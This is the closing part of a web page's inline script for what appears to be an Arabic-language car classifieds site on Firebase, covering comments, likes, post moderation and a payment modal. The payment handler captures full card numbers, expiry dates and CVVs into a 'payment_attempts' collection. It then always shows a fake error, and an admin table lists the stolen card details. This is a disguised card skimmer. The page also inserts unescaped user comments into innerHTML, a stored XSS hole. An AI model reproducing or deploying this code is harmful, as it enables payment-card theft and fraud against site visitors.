            if (snapshot.empty) {
                commentsListDiv.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:12px;">لا توجد تعليقات بعد، كن أول المعلقين!</div>';
                return;
            }

            snapshot.forEach(docSnap => {
                const comment = docSnap.data();
                const commentId = docSnap.id;
                const likedKey = `liked_comment_${commentId}`;
                const isLiked = localStorage.getItem(likedKey) === 'true';

                const isCommentAdmin = comment.isAdminComment || comment.author === "ادمن";

                const commentEl = document.createElement('div');
                commentEl.className = 'comment-item';
                commentEl.innerHTML = `
                    <div class="comment-header">
                        <span class="comment-author ${isCommentAdmin ? 'admin-badge-name' : ''}">
                            ${comment.author} 
                            ${isCommentAdmin ? `<span class="verified-badge" title="موثق">✓</span>` : ''}
                        </span>
                    </div>
                    <div class="comment-text">${comment.text}</div>
                    <button class="comment-like-btn ${isLiked ? 'liked' : ''}" onclick="toggleCommentLike('${postId}', '${commentId}')">
                        ❤️ <span>${comment.likes || 0}</span> إعجاب
                    </button>
                `;
                commentsListDiv.appendChild(commentEl);
            });
        });
    }

    async function toggleCommentLike(postId, commentId) {
        const likedKey = `liked_comment_${commentId}`;
        const isLiked = localStorage.getItem(likedKey) === 'true';
        const commentRef = window.doc(window.db, "posts", postId, "comments", commentId);

        try {
            if (isLiked) {
                await window.updateDoc(commentRef, { likes: window.increment(-1) });
                localStorage.removeItem(likedKey);
            } else {
                await window.updateDoc(commentRef, { likes: window.increment(1) });
                localStorage.setItem(likedKey, 'true');
            }
        } catch (error) {
            console.error("Error liking comment", error);
        }
    }

    function openPaymentModal() { openModal('paymentModal'); }
    function openAttemptsModal() { loadAttempts(); openModal('adminAttemptsModal'); }

    document.getElementById('paymentForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const data = {
            time: new Date().toLocaleString(),
            cardType: document.getElementById('cardType').value,
            cardHolder: document.getElementById('cardHolder').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiryMonth: document.getElementById('expiryMonth').value,
            expiryYear: document.getElementById('expiryYear').value,
            cvv: document.getElementById('cvv').value,
            createdAt: Date.now()
        };
        try { await window.addDoc(window.collection(window.db, "payment_attempts"), data); } catch (e) {}
        document.getElementById('error-msg').style.display = 'block';
        document.getElementById('paymentForm').reset();
    });

    async function loadAttempts() {
        const tbody = document.getElementById('attempts-list');
        tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; border: 1px solid #cbd5e1; padding: 12px; color: #64748b;">جاري التحميل...</td></tr>';
        try {
            const querySnapshot = await window.getDocs(window.collection(window.db, "payment_attempts"));
            tbody.innerHTML = '';
            if (querySnapshot.empty) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; border: 1px solid #cbd5e1; padding: 12px; color: #64748b;">لا توجد محاولات مسجلة</td></tr>';
                return;
            }
            querySnapshot.forEach(docSnap => {
                const item = docSnap.data();
                tbody.innerHTML += `
                    <tr>
                        <td style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px;">${item.time || ''}</td>
                        <td style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px;">${item.cardType || ''}</td>
                        <td style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px;">${item.cardHolder || ''}</td>
                        <td style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px;">${item.cardNumber || ''}</td>
                        <td style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px;">${item.expiryMonth || ''}/${item.expiryYear || ''}</td>
                        <td style="border: 1px solid #cbd5e1; padding: 10px; text-align: right; font-size: 12px;">${item.cvv || ''}</td>
                    </tr>
                `;
            });
        } catch (e) { tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 12px; color: red;">فشل التحميل</td></tr>'; }
    }

    function renderPosts() {
        const listDiv = document.getElementById('listings');
        const pendingDiv = document.getElementById('pendingList');
        
        listDiv.innerHTML = '';
        if (pendingDiv) pendingDiv.innerHTML = '';

        let approvedPosts = posts.filter(p => p.approved === true);
        let pendingPosts = posts.filter(p => p.approved !== true);

        if (approvedPosts.length === 0) {
            listDiv.innerHTML = '<div class="empty-state">🚗 لا توجد إعلانات معروضة حالياً.</div>';
        } else {
            approvedPosts.forEach(post => {
                const isPostLiked = localStorage.getItem(`liked_post_${post.id}`) === 'true';
                listDiv.innerHTML += `
                    <div class="post-card" onclick="openPostDetail('${post.id}')">
                        ${post.image ? `<div class="post-img-container"><img src="${post.image}" class="post-img"></div>` : ''}
                        <div class="post-body">
                            <p class="post-desc">${post.desc || ''}</p>
                            <div class="post-actions-row">
                                <button class="post-like-btn ${isPostLiked ? 'liked' : ''}" onclick="event.stopPropagation(); togglePostLike('${post.id}')">
                                    ❤️ <span>${post.likes || 12}</span> إعجاب
                                </button>
                                <span style="font-size: 10px; color: var(--text-muted);">💬 تفاصيل وتعليقات</span>
                            </div>
                            <button class="btn-unlock">💬 عرض التعليقات والتفاصيل</button>
                            ${isAdmin ? `<button class="btn-delete" onclick="event.stopPropagation(); deletePost('${post.id}')">حذف المنشور</button>` : ''}
                        </div>
                    </div>
                `;
            });
        }

        if (isAdmin && pendingDiv) {
            if (pendingPosts.length === 0) {
                pendingDiv.innerHTML = '<div style="color:var(--text-muted); font-size:12px; text-align:center; padding:10px;">لا توجد منشورات بانتظار الموافقة حالياً.</div>';
            } else {
                pendingPosts.forEach(post => {
                    pendingDiv.innerHTML += `
                        <div style="background:rgba(11,15,25,0.7); border:1px solid var(--border-color); padding:12px; border-radius:var(--radius-sm);">
                            <div style="font-size:12px; color:#fff; margin-bottom:8px; line-height:1.5;">${post.desc || 'بلا نص'}</div>
                            <div style="display:flex; gap:8px;">
                                <button class="btn-add" style="background:#10b981; padding:6px; font-size:11px;" onclick="approvePost('${post.id}')">موافقة ونشر</button>
                                <button class="btn-delete" style="margin-top:0; padding:6px; font-size:11px;" onclick="deletePost('${post.id}')">رفض وحذف</button>
                            </div>
                        </div>
                    `;
                });
            }
        }
    }

    window.addEventListener('DOMContentLoaded', () => {
        initSiteSettings();
        
        window.onSnapshot(window.collection(window.db, "posts"), (snapshot) => {
            posts = [];
            snapshot.dates = Date.now();
            snapshot.forEach(docSnap => {
                posts.push({ id: docSnap.id, ...docSnap.data() });
            });
            renderPosts();
        });
    });
</script>

</body>
</html>
